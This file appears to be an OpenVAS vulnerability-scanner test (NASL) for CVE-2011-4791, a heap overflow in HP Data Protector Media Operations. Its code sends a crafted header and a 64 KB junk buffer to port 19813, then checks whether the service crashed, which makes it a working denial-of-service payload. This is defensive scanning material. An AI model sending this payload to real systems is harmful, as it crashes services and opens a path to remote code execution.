###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_data_protector_media_operations_bof_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# HP Data Protector Media Operations Heap Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  within the context of the application or cause a denial of service condition.
  Impact Level: System/Application";
tag_affected = "HP Data Protector Media Operations versions 6.20 and prior.";
tag_insight = "The flaw is due to a boundary error when processing large size
  packets. This can be exploited to cause a heap-based buffer overflow via
  a specially crafted packet sent to port 19813.";
tag_solution = "No solution or patch is available as of 08th November, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to
  http://www8.hp.com/us/en/software/software-product.html?compURI=tcm:245-936920";
tag_summary = "This host is running HP Data Protector Media Operations and is
  prone to buffer overflow vulnerability.";

if(description)
{
  script_id(802269);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-4791");
  script_bugtraq_id(47004);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"creation_date", value:"2011-11-08 11:11:11 +0530 (Tue, 08 Nov 2011)");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_name("HP Data Protector Media Operations Heap Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/76842");
  script_xref(name : "URL" , value : "https://secunia.com/advisories/46688");
  script_xref(name : "URL" , value : "http://zerodayinitiative.com/advisories/ZDI-11-112/");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/hpdpmedia_2-adv.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/106591/hpdpmedia_2-adv.txt");

  script_description(desc);
  script_summary("Determine HP Data Protector Media Operations Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(19813);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

## Default Port
port = 19813;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Check Banner And Confirm Application
res = recv(socket:soc, length:512);
if("MediaDB.4DC" >!< res)
{
  close(soc);
  exit(0);
}

## Building Exploit
head = raw_string(0x03, 0x00, 0x00, 0x01, 0xff, 0xff, 0xf0, 0x00, 0x01, 0x02,
                  0x03, 0x04, 0x04);
junk = crap(data:"a", length: 65536);

## Sending Exploit
send = send(socket:soc, data: head + junk);
close(soc);

## Waiting
sleep(3);

## Try to Open Socket
if(!soc1 =  open_sock_tcp(port))
{
  security_hole(port);
  exit(0);
}

## Confirm Server is still alive and responding
if(! res = recv(socket:soc1, length:512)){
  security_hole(port);
}
close(soc1);
